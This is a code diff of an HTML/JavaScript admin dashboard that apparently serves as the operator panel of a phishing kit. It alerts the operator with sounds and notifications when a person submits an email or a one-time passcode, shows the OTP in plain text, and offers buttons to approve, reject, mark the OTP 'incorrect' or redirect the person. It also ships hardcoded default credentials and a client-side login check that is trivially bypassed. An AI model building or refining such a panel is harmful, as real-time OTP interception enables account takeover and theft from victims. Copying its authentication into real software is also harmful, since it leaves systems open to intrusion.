@@ -5,42 +5,237 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
   <title>Atlas Admin Dashboard</title>
   <style>
-    *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,sans-serif}
-    body{background:#f3f4f6;padding:20px}
-    .container{max-width:1400px;margin:0 auto}
-    .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;flex-wrap:wrap;gap:16px}
-    h1{font-size:24px;font-weight:700;color:#1f2937}
-    .logout-btn{padding:10px 20px;background:#ef4444;color:white;border:none;border-radius:50px;cursor:pointer}
-    .stats{display:flex;gap:16px;margin-bottom:24px;flex-wrap:wrap}
-    .stat-card{background:white;border-radius:16px;padding:16px 24px;flex:1;min-width:120px;box-shadow:0 1px 3px rgba(0,0,0,0.05)}
-    .stat-card h3{font-size:13px;color:#6b7280;margin-bottom:8px}
-    .stat-card .number{font-size:28px;font-weight:700;color:#1f2937}
-    .table-container{background:white;border-radius:20px;overflow-x:auto;box-shadow:0 1px 3px rgba(0,0,0,0.05)}
-    table{width:100%;border-collapse:collapse;min-width:800px}
-    th{text-align:left;padding:16px;background:#f9fafb;font-weight:600;font-size:13px;color:#6b7280;border-bottom:1px solid #e5e7eb}
-    td{padding:14px 16px;border-bottom:1px solid #f0f0f0;font-size:14px;color:#374151}
-    tr:hover{background:#f9fafb}
-    .copy-btn{background:none;border:none;cursor:pointer;color:#9ca3af;margin-left:8px}
-    .copy-btn:hover{color:#4a4ff0}
-    .status-badge{display:inline-block;padding:4px 10px;border-radius:30px;font-size:12px;font-weight:500}
-    .status-pending{background:#fef3c7;color:#d97706}
-    .status-approved{background:#d1fae5;color:#059669}
-    .status-otp_submitted{background:#e0e7ff;color:#4f46e5}
-    .status-redirected{background:#fee2e2;color:#dc2626}
-    .status-rejected{background:#f3f4f6;color:#6b7280}
-    .action-group{display:flex;gap:8px;flex-wrap:wrap}
-    .action-btn{padding:6px 12px;border-radius:8px;font-size:12px;font-weight:500;border:none;cursor:pointer}
-    .btn-approve{background:#059669;color:white}
-    .btn-reject{background:#6b7280;color:white}
-    .btn-incorrect{background:#e11d48;color:white}
-    .btn-redirect{background:#3b82f6;color:white}
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
+    }
+    body {
+      background: #f3f4f6;
+      padding: 20px;
+    }
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+    .login-card {
+      max-width: 400px;
+      margin: 100px auto;
+      background: white;
+      border-radius: 24px;
+      padding: 32px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+    .login-card h2 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 24px;
+      color: #1f2937;
+      text-align: center;
+    }
+    .login-card input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1.5px solid #e5e7eb;
+      border-radius: 12px;
+      font-size: 15px;
+      margin-bottom: 16px;
+    }
+    .login-card input:focus {
+      outline: none;
+      border-color: #4a4ff0;
+    }
+    .login-card button {
+      width: 100%;
+      padding: 14px;
+      background: #4a4ff0;
+      color: white;
+      border: none;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .login-error {
+      color: #dc2626;
+      font-size: 13px;
+      margin-top: 12px;
+      text-align: center;
+      display: none;
+    }
+    .dashboard-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+    .dashboard-header h1 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1f2937;
+    }
+    .logout-btn {
+      padding: 10px 20px;
+      background: #ef4444;
+      color: white;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+    .stats {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+    }
+    .stat-card {
+      background: white;
+      border-radius: 16px;
+      padding: 16px 24px;
+      flex: 1;
+      min-width: 120px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+    .stat-card h3 {
+      font-size: 13px;
+      color: #6b7280;
+      margin-bottom: 8px;
+    }
+    .stat-card .number {
+      font-size: 28px;
+      font-weight: 700;
+      color: #1f2937;
+    }
+    .table-container {
+      background: white;
+      border-radius: 20px;
+      overflow-x: auto;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      min-width: 800px;
+    }
+    th {
+      text-align: left;
+      padding: 16px;
+      background: #f9fafb;
+      font-weight: 600;
+      font-size: 13px;
+      color: #6b7280;
+      border-bottom: 1px solid #e5e7eb;
+    }
+    td {
+      padding: 14px 16px;
+      border-bottom: 1px solid #f0f0f0;
+      font-size: 14px;
+      color: #374151;
+    }
+    tr:hover {
+      background: #f9fafb;
+    }
+    .copy-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #9ca3af;
+      margin-left: 8px;
+      font-size: 14px;
+    }
+    .copy-btn:hover {
+      color: #4a4ff0;
+    }
+    .status-badge {
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 30px;
+      font-size: 12px;
+      font-weight: 500;
+    }
+    .status-pending {
+      background: #fef3c7;
+      color: #d97706;
+    }
+    .status-approved {
+      background: #d1fae5;
+      color: #059669;
+    }
+    .status-otp_submitted {
+      background: #e0e7ff;
+      color: #4f46e5;
+    }
+    .status-redirected {
+      background: #fee2e2;
+      color: #dc2626;
+    }
+    .status-rejected {
+      background: #f3f4f6;
+      color: #6b7280;
+    }
+    .action-group {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .action-btn {
+      padding: 6px 12px;
+      border-radius: 8px;
+      font-size: 12px;
+      font-weight: 500;
+      border: none;
+      cursor: pointer;
+    }
+    .btn-approve {
+      background: #059669;
+      color: white;
+    }
+    .btn-reject {
+      background: #6b7280;
+      color: white;
+    }
+    .btn-incorrect {
+      background: #e11d48;
+      color: white;
+    }
+    .btn-redirect {
+      background: #3b82f6;
+      color: white;
+    }
+    .enable-sound-btn {
+      background: #4a4ff0;
+      color: white;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 50px;
+      cursor: pointer;
+      font-weight: 500;
+      margin-right: 12px;
+    }
   </style>
 </head>
 <body>
-<div class="container">
-  <div class="header">
+<div class="container" id="loginContainer">
+  <div class="login-card">
+    <h2>Admin Login</h2>
+    <input type="email" id="adminEmail" placeholder="Email" value="admin@system.com">
+    <input type="password" id="adminPassword" placeholder="Password" value="admin123">
+    <button id="loginBtn">Login</button>
+    <div id="loginError" class="login-error"></div>
+  </div>
+</div>
+
+<div class="container" id="dashboardContainer" style="display: none;">
+  <div class="dashboard-header">
     <h1>Atlas Admin Dashboard</h1>
-    <button class="logout-btn" id="logoutBtn">Logout</button>
+    <div>
+      <button id="enableSoundBtn" class="enable-sound-btn">🔊 Enable Sound</button>
+      <button id="logoutBtn" class="logout-btn">Logout</button>
+    </div>
   </div>
   <div class="stats">
     <div class="stat-card"><h3>Total Users</h3><div class="number" id="totalUsers">0</div></div>
@@ -54,27 +249,122 @@
     </table>
   </div>
 </div>
+
 <script src="/socket.io/socket.io.js"></script>
 <script>
-  const token = localStorage.getItem('adminToken');
-  if (!token) window.location.href = '/admin/index.html';
+  let socket = null;
+  let soundEnabled = false;
+  let emailSound = null;
+  let otpSound = null;
 
-  const socket = io();
-  const emailSound = new Audio('/sounds/email.mp3');
-  const otpSound = new Audio('/sounds/otp.mp3');
+  // Pre-create audio elements
+  function initSounds() {
+    emailSound = new Audio('/sounds/email.mp3');
+    otpSound = new Audio('/sounds/otp.mp3');
+    emailSound.load();
+    otpSound.load();
+  }
 
-  let users = [];
+  function playEmailSound() {
+    if (soundEnabled && emailSound) {
+      emailSound.play().catch(e => console.log('Audio play failed:', e));
+    }
+  }
+
+  function playOtpSound() {
+    if (soundEnabled && otpSound) {
+      otpSound.play().catch(e => console.log('Audio play failed:', e));
+    }
+  }
+
+  function showBrowserNotification(title, body) {
+    if (Notification.permission === 'granted') {
+      new Notification(title, { body });
+    }
+  }
+
+  // Login logic
+  document.getElementById('loginBtn').addEventListener('click', async () => {
+    const email = document.getElementById('adminEmail').value.trim();
+    const password = document.getElementById('adminPassword').value;
+    const errorDiv = document.getElementById('loginError');
+    try {
+      const res = await fetch('/api/admin/check', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password })
+      });
+      if (res.ok) {
+        localStorage.setItem('adminToken', 'loggedin');
+        document.getElementById('loginContainer').style.display = 'none';
+        document.getElementById('dashboardContainer').style.display = 'block';
+        initSounds();
+        connectSocket();
+        loadUsers();
+        setInterval(loadUsers, 5000);
+        
+        // Request notification permission
+        if (Notification.permission === 'default') {
+          Notification.requestPermission();
+        }
+      } else {
+        errorDiv.textContent = 'Invalid credentials';
+        errorDiv.style.display = 'block';
+      }
+    } catch (err) {
+      errorDiv.textContent = 'Network error';
+      errorDiv.style.display = 'block';
+    }
+  });
+
+  // Enable sound button - REQUIRES USER CLICK TO UNLOCK AUDIO
+  document.getElementById('enableSoundBtn')?.addEventListener('click', () => {
+    soundEnabled = true;
+    // Play a silent test to unlock audio on browsers
+    const testAudio = new Audio();
+    testAudio.play().catch(() => {});
+    alert('Sound enabled! You will hear notifications for new emails and OTPs.');
+  });
+
+  function connectSocket() {
+    socket = io();
+    
+    socket.on('new-email', (data) => {
+      console.log('New email received:', data);
+      playEmailSound();
+      showBrowserNotification('New Email Received', `${data.email} signed up`);
+      loadUsers();
+    });
+    
+    socket.on('new-otp', (data) => {
+      console.log('New OTP received:', data);
+      playOtpSound();
+      showBrowserNotification('New OTP Received', `${data.email} submitted OTP: ${data.otp}`);
+      loadUsers();
+    });
+    
+    socket.on('approve-user', () => loadUsers());
+    socket.on('reject-user', () => loadUsers());
+    socket.on('incorrect-otp', () => loadUsers());
+    socket.on('redirect-to-sad', () => loadUsers());
+  }
 
   async function loadUsers() {
     try {
       const res = await fetch('/api/users');
-      users = await res.json();
-      renderTable();
-      updateStats();
+      const users = await res.json();
+      displayUsers(users);
+      updateStats(users);
     } catch (err) {}
   }
 
-  function renderTable() {
+  function updateStats(users) {
+    document.getElementById('totalUsers').innerText = users.length;
+    document.getElementById('pendingEmails').innerText = users.filter(u => u.status === 'pending').length;
+    document.getElementById('otpSubmitted').innerText = users.filter(u => u.status === 'otp_submitted').length;
+  }
+
+  function displayUsers(users) {
     const tbody = document.getElementById('usersTable');
     tbody.innerHTML = users.map(user => `
       <tr>
@@ -91,12 +381,6 @@
         </td>
       </tr>
     `).join('');
-  }
-
-  function updateStats() {
-    document.getElementById('totalUsers').innerText = users.length;
-    document.getElementById('pendingEmails').innerText = users.filter(u => u.status === 'pending').length;
-    document.getElementById('otpSubmitted').innerText = users.filter(u => u.status === 'otp_submitted').length;
   }
 
   async function actionUser(action, email) {
@@ -119,20 +403,26 @@
     return str.replace(/[&<>]/g, m => m === '&' ? '&amp;' : m === '<' ? '&lt;' : '&gt;');
   }
 
-  socket.on('new-email', () => { emailSound.play(); loadUsers(); });
-  socket.on('new-otp', () => { otpSound.play(); loadUsers(); });
-  socket.on('approve-user', () => loadUsers());
-  socket.on('reject-user', () => loadUsers());
-  socket.on('incorrect-otp', () => loadUsers());
-  socket.on('redirect-to-sad', () => loadUsers());
-
-  document.getElementById('logoutBtn').addEventListener('click', () => {
+  document.getElementById('logoutBtn')?.addEventListener('click', () => {
     localStorage.removeItem('adminToken');
-    window.location.href = '/admin/index.html';
+    location.reload();
   });
 
-  loadUsers();
-  setInterval(loadUsers, 5000);
+  // Check if already logged in
+  if (localStorage.getItem('adminToken')) {
+    document.getElementById('loginContainer').style.display = 'none';
+    document.getElementById('dashboardContainer').style.display = 'block';
+    initSounds();
+    connectSocket();
+    loadUsers();
+    setInterval(loadUsers, 5000);
+    if (Notification.permission === 'default') {
+      Notification.requestPermission();
+    }
+  }
+
+  window.actionUser = actionUser;
+  window.copyToClipboard = copyToClipboard;
 </script>
 </body>
 </html>
